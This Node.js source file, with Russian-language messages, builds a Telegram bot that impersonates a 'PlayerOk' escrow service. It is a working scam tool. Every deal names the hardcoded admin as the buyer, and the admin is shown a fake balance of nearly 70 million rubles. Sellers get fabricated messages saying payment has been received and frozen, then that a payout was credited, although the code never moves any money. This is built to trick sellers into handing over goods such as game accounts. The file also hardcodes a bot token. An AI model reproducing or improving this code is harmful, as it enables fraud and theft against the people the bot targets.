const { Telegraf, Markup, session } = require('telegraf');
const http = require('http');

// Инициализация бота по токену
const BOT_TOKEN = process.env.BOT_TOKEN || '8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY';
const bot = new Telegraf(BOT_TOKEN);

// Включаем сессии для хранения шагов создания сделки
bot.use(session());

const ADMIN = 'k13_way';
const users = {};
const deals = {};

const welcomeText = `👋 *Добро пожаловать в PlayerOk!*\n\n🛡️ *PlayerOk* — ваш автоматизированный торговый гарант. Мы обеспечиваем 100% безопасность внебиржевых сделок 24/7.\n\n⚡ *Наши преимущества:*\n• Моментальная фиксация и заморозка средств.\n• Верифицированные алгоритмы исполнения.\n• Быстрый вывод на любые реквизиты.\n\n• Комиссия сервиса: *1%*\n• Режим работы системы: *24/7*\n• Главный модератор: @sw1zyy01\n\n✨ Выберите нужный раздел на панели ниже:`;

const mainKb = Markup.inlineKeyboard([
  [Markup.button.callback('💳 Баланс профиля', 'bal'), Markup.button.callback('🤝 Создать сделку', 'create')],
  [Markup.button.callback('🛡️ Безопасность', 'safe'), Markup.button.callback('👨‍💻 Поддержка', 'supp')]
]);

bot.start((ctx) => {
  const username = ctx.from.username;
  if (username) users[username.toLowerCase()] = ctx.chat.id;
  if (ctx.session) ctx.session = {};
  return ctx.replyWithMarkdown(welcomeText, mainKb).catch((e) => console.log(e));
});

bot.action('bal', (ctx) => {
  const username = ctx.from.username || 'user';
  const isId = username.toLowerCase() === ADMIN.toLowerCase();
  const text = `💳 *Личный кабинет пользователя* \`@${username}\`\n━━━━━━━ СИСТЕМА ГАРАНТА ━━━━━━━\n💰 *Доступный баланс:* ${isId ? '69 999 999' : '0'}.00 руб.\n🔒 *Заморожено в сделках:* 0.00 руб.\n\n📊 *Ваша статистика на PlayerOk:*\n• Всего операций: *0*\n• Успешных обменов: *0*\n• Открытых споров/арбитражей: *0*\n\n✅ Ваш аккаунт полностью верифицирован и защищен системой безопасности.`;
  return ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Назад в меню', 'menu')]]) }).catch((e) => console.log(e));
});

bot.action('create', (ctx) => {
  ctx.session = { step: 'partner' };
  return ctx.editMessageText(`🤝 *Инициализация новой безопасной сделки*\n━━━━━━━ ШАГ 1 ИЗ 3 ━━━━━━━\n\n👤 Пожалуйста, укажите **@юзернейм** продавца, у которого вы собираетесь приобрести товар или услугу:\n\n_Отправьте юзернейм текстом прямо в этот чат..._`, { parse_mode: 'Markdown' }).catch((e) => console.log(e));
});

bot.on('text', async (ctx) => {
  const username = ctx.from.username;
  if (username) users[username.toLowerCase()] = ctx.chat.id;

  if (!ctx.session || !ctx.session.step) return;
  const txt = ctx.message.text.trim();

  if (ctx.session.step === 'partner') {
    ctx.session.partner = txt.replace('@', '').toLowerCase();
    ctx.session.step = 'title';
    return ctx.reply('📦 *Параметры торговой операции* [ШАГ 2/3]\n\n✍️ Введите точное название или описание товара (например: _Аккаунт Standoff 2_):', { parse_mode: 'Markdown' }).catch((e) => console.log(e));
  }
  if (ctx.session.step === 'title') {
    ctx.session.title = txt;
    ctx.session.step = 'price';
    return ctx.reply('💰 *Финансовые условия сделки* [ШАГ 3/3]\n\n💳 Укажите сумму покупки в рублях (введите только число):', { parse_mode: 'Markdown' }).catch((e) => console.log(e));
  }
  if (ctx.session.step === 'price') {
    const price = parseFloat(txt) || 1000;
    const dealId = Math.floor(100000 + Math.random() * 900000).toString();
    
    deals[dealId] = { id: dealId, seller: ctx.session.partner, buyer: ADMIN, title: ctx.session.title, amount: price, status: 'pending', b_chat: ctx.chat.id };
    ctx.session = {};

    ctx.replyWithMarkdown(`✨ *Бланк сделки #${dealId} сформирован!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🛒 *Роль:* ПОКУПАТЕЛЬ\n📦 *Товар:* ${deals[dealId].title}\n💰 *Сумма:* ${price.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🚀 Предложение автоматически отправлено продавцу @${deals[dealId].seller}...`).catch((e) => console.log(e));

    const tChat = users[deals[dealId].seller.toLowerCase()];
    if (tChat) {
      deals[dealId].s_chat = tChat;
      const propText = `🔔 *Вам поступило предложение о продаже!* (#${dealId})\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${deals[dealId].title}\n💰 *Вы получите:* ${price.toLocaleString('ru-RU')} руб.\n🛒 *Покупатель:* @${ADMIN}\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🛡️ *ПРОТОКОЛ БЕЗОПАСНОСТИ:*\n• Вы обязаны фиксировать на видео момент передачи данных товара.\n• Вся переписка должна проходить строго внутри платформы.\n• Попытка обмана приведет к блокировке ваших средств.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nВы согласны открыть сделку под защитой Гаранта PlayerOk?`;
      bot.telegram.sendMessage(tChat, propText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🤝 Принять условия', `ok_${dealId}`)]]) }).catch((e) => console.log(e));
    } else {
      ctx.replyWithMarkdown(`⚠️ Продавец @${deals[dealId].seller} еще не активировал этого бота.\n\n*Решение:* пусть продавец напишет вашему боту команду \`/start\`, после этого создайте сделку заново.`).catch((e) => console.log(e));
    }
  }
});

// Безопасный разбор событий нажатия кнопок без регулярных выражений и сплитов
bot.on('callback_query', async (ctx) => {
  const data = ctx.callbackQuery.data;
  
  if (data.startsWith('ok_')) {
    const dealId = data.substring(3);
    const d = deals[dealId];
    if (!d) return ctx.answerCbQuery('❌ Ошибка: Сделка не найдена.');
    d.status = 'accepted'; d.s_chat = ctx.chat.id;

    const buyerText = `🔔 *Продавец @${d.seller} успешно принял условия сделки #${d.id}!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 *Статус:* \`[💳 ОПЛАТА] Ожидание перевода от покупателя\`\n📦 *Товар:* ${d.title}\n💰 *Сумма к оплате:* ${d.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nДля холдирования и заморозки средств на балансе Гаранта перейдите к оплате:`;
    bot.telegram.sendMessage(d.b_chat, buyerText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить сделку балансом', `pay_${d.id}`)]]) }).catch((e) => console.log(e));
    
    const sellerText = `🤝 *Вы приняли условия безопасной сделки #${d.id}*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${d.title}\n💰 *Выплата после проверки:* ${d.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ Ожидайте, пока покупатель @${d.buyer} внесет оплату на защищенный счет маркетплейса PlayerOk.`;
    return ctx.editMessageText(sellerText, { parse_mode: 'Markdown' }).catch((e) => console.log(e));
  }

  if (data.startsWith('pay_')) {
    const dealId = data.substring(4);
    const d = deals[dealId];
    if (!d) return ctx.answerCbQuery('❌ Ошибка.');
    d.status = 'paid';

    const sellerText = `💰 *Покупатель @${d.buyer} успешно оплатил сделку #${d.id}! Средства заморожены.*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 *Статус:* \`[📦 ДОСТАВКА] Ожидание отправки товара\`\n📦 *Товар:* ${d.title}\n💰 *Сумма выплат:* ${d.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🛡️ *НАПОМИНАНИЕ:* Обязательно запишите процесс передачи товара на видео.\n\nВам необходимо передать товар покупателю. После успешной передачи нажмите кнопку ниже:`;
    bot.telegram.sendMessage(d.s_chat, sellerText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('📦 Товар полностью передан', `sent_${d.id}`)]]) }).catch((e) => console.log(e));

    const buyerText = `✅ *Сделка #${d.id} успешно оплачена!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔒 Денежные средства успешно заморожены на безопасном балансе Гаранта PlayerOk.\n\n⏳ Ожидайте, пока продавец @${d.seller} предоставит вам все необходимые данные от товара.`;
    return ctx.editMessageText(buyerText, { parse_mode: 'Markdown' }).catch((e) => console.log(e));
  }

  if (data.startsWith('sent_')) {
    const dealId = data.substring(5);
    const d = deals[dealId];
    if (!d) return ctx.answerCbQuery('❌ Ошибка.');
    d.status = 'goods_sent';

    const buyerText = `📦 *Продавец @${d.seller} подтвердил отправку товара по сделке #${d.id}!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 *Статус:* \`[🔎 ПРОВЕРКА] Ожидание подтверждения покупателем\`\n\nПожалуйста, тщательно проверьте полученные данные или аккаунт. Если все работает стабильно, закройте сделку для совершения выплаты продавцу:`;
    bot.telegram.sendMessage(d.b_chat, buyerText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить получение товара', `end_${d.id}`)]]) }).catch((e) => console.log(e));

    const sellerText = `✅ *Уведомление успешно отправлено покупателю.*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nВы подтвердили передачу товара по сделке #${d.id}.\n\n⏳ Ожидаем финальной проверки данных и официального закрытия ордера со стороны покупателя.`;
    return ctx.editMessageText(sellerText, { parse_mode: 'Markdown' }).catch((e) => console.log(e));
  }

  if (data.startsWith('end_')) {
    const dealId = data.substring(4);
    const d = deals[dealId];
    if (!d) return ctx.answerCbQuery('❌ Ошибка.');
    d.status = 'completed';

    const sellerText = `🎉 *Сделка #${d.id} успешно завершена!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nПокупатель подтвердил получение. Выплата в размере ${d.amount.toLocaleString('ru-RU')} руб. успешно зачислена на баланс вашего профиля.`;
    bot.telegram.sendMessage(d.s_chat, sellerText, { parse_mode: 'Markdown' }).catch((e) => console.log(e));

    const buyerText = `🎉 *Сделка #${d.id} успешно завершена!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nВы успешно подтвердили выполнение всех обязательств. Средства переведены на счет продавца.\n\n✨ Спасибо за доверие к автоматизированному гарант-сервису *PlayerOk*!`;
    return ctx.editMessageText(buyerText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ В главное меню', 'menu')]]) }).catch((e) => console.log(e));
  }
});

